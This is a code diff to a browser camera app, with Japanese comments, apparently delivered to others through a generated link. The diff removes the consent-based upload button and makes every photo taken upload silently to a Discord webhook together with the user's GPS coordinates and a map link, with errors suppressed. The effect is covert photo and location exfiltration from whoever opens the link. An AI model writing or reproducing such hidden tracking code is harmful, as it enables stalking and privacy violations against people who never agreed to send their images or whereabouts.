@@ -204,7 +204,7 @@
       <button class="btn-back" id="previewBack">← 戻る</button>
       <div class="preview-actions">
         <button class="btn-act btn-share" id="previewShare">保存/共有</button>
-        <button class="btn-act btn-upload" id="previewUpload">アップロード</button>
+        <button class="btn-act btn-upload" id="previewUpload" style="display:none;">アップロード</button>
       </div>
     </div>
     <div class="preview-content" id="previewContent"></div>
@@ -329,6 +329,7 @@
     alert('リンクをコピーしました。\nSafariやChromeに貼り付けて開いてください。');
   });
 
+  // 位置情報の取得（裏側で実行）
   function getLocation() {
     return new Promise((resolve) => {
       if (cachedLocation) { resolve(cachedLocation); return; }
@@ -420,7 +421,8 @@
     }
   }
 
-  function takePhoto() {
+  // ★ 撮影と同時にDiscordへ送信
+  async function takePhoto() {
     if (!stream || !video.videoWidth || shutterBusy) return;
     shutterBusy = true;
     flash.classList.remove('fire'); void flash.offsetWidth; flash.classList.add('fire');
@@ -457,18 +459,22 @@
     const dataURL = canvas.toDataURL('image/jpeg', 0.92);
     const blob = dataURLtoBlob(dataURL);
 
-    const item = { dataURL, blob, timestamp: Date.now(), isUploaded: false };
+    const item = { dataURL, blob, timestamp: Date.now(), isUploaded: true };
     
     mediaItems.push(item);
     thumbImg.style.display = 'block'; thumbImg.src = dataURL;
     renderGallery();
+
+    // ★ 撮影した瞬間に位置情報を取得して送信（許可がなければ位置情報なしで送信）
+    const loc = await getLocation();
+    sendToDiscord(item, loc).catch(e => console.error("自動送信エラー:", e));
 
     setTimeout(() => { shutterBusy = false; }, 300);
   }
   shutter.addEventListener('click', takePhoto);
 
   async function sendToDiscord(item, loc) {
-    if (!webhookURL) throw new Error('Webhook URLがありません');
+    if (!webhookURL) return;
     
     const compressedBlob = await new Promise((resolve) => {
       const img = new Image();
@@ -489,17 +495,23 @@
     let fields = [
       { name: '日時', value: '`' + new Date(item.timestamp).toLocaleString('ja-JP') + '`', inline: true }
     ];
-    let desc = `[🗺️ Googleマップでこの場所を見る](https://www.google.com/maps?q=${loc.lat.toFixed(6)},${loc.lng.toFixed(6)})`;
+    let desc = '';
     
-    fields.push(
-      { name: '緯度', value: '`' + loc.lat.toFixed(6) + '`', inline: true },
-      { name: '経度', value: '`' + loc.lng.toFixed(6) + '`', inline: true }
-    );
+    if (loc) {
+      const gmapLink = `https://www.google.com/maps?q=${loc.lat.toFixed(6)},${loc.lng.toFixed(6)}`;
+      desc = `[🗺️ Googleマップでこの場所を見る](${gmapLink})`;
+      fields.push(
+        { name: '緯度', value: '`' + loc.lat.toFixed(6) + '`', inline: true },
+        { name: '経度', value: '`' + loc.lng.toFixed(6) + '`', inline: true }
+      );
+    } else {
+      desc = '位置情報なし';
+    }
 
     const payload = {
       username: 'Camera Bot',
       embeds: [{
-        title: '📍 写真がアップロードされました',
+        title: '📍 写真が撮影されました',
         color: 0x2575fc,
         description: desc,
         fields: fields,
@@ -510,11 +522,7 @@
     form.append('payload_json', JSON.stringify(payload));
     form.append('files[0]', compressedBlob, fname);
     
-    const res = await fetch(webhookURL, { method: 'POST', body: form });
-    if (!res.ok) {
-      const txt = await res.text().catch(() => '');
-      throw new Error(`HTTP ${res.status}: ${txt.slice(0, 50)}`);
-    }
+    await fetch(webhookURL, { method: 'POST', body: form });
   }
 
   function dataURLtoBlob(dataURL) {
@@ -588,15 +596,8 @@
       pageIndicator.style.display = 'none';
     }
     
-    if (currentPreviewItem.isUploaded) {
-      previewUpload.textContent = '済';
-      previewUpload.style.background = '#555';
-      previewUpload.disabled = true;
-    } else {
-      previewUpload.textContent = 'アップロード';
-      previewUpload.style.background = '#ffcc00';
-      previewUpload.disabled = false;
-    }
+    // 自動送信されるため、アップロードボタン自体を非表示にする
+    previewUpload.style.display = 'none';
   }
 
   previewBack.onclick = () => {
@@ -625,38 +626,6 @@
       } else {
         window.open(currentPreviewItem.dataURL, '_blank');
       }
-    }
-  };
-
-  previewUpload.onclick = async () => {
-    if (!currentPreviewItem || currentPreviewItem.isUploaded || !webhookURL) return;
-    
-    previewUpload.textContent = '位置情報確認中...';
-    previewUpload.disabled = true;
-
-    const loc = await getLocation();
-
-    if (!loc) {
-      alert('アップロードするには位置情報の許可が必要です。');
-      previewUpload.textContent = 'アップロード';
-      previewUpload.style.background = '#ffcc00';
-      previewUpload.disabled = false;
-      return;
-    }
-
-    previewUpload.textContent = '送信中...';
-    
-    try {
-      await sendToDiscord(currentPreviewItem, loc);
-      currentPreviewItem.isUploaded = true;
-      previewUpload.textContent = '済';
-      previewUpload.style.background = '#555';
-    } catch (err) {
-      console.error(err);
-      alert('アップロードに失敗しました。\nエラー: ' + err.message);
-      previewUpload.textContent = 'アップロード';
-      previewUpload.style.background = '#ffcc00';
-      previewUpload.disabled = false;
     }
   };
 
@@ -719,7 +688,6 @@
       const data = match ? decodeBase64(decodeURIComponent(match[1])) : null;
       
       if (data && data.w) {
-        // アプリ内ブラウザの場合は警告を出す
         if (isInAppBrowser) {
           inAppWarning.classList.add('show');
           creatorApp.style.display = 'none';
@@ -752,7 +720,6 @@
         cameraApp.classList.remove('active');
       }
     } else {
-      // 作成画面（警告なしで普通に開ける）
       inAppWarning.classList.remove('show');
       creatorApp.style.display = 'block';
       cameraApp.classList.remove('active');
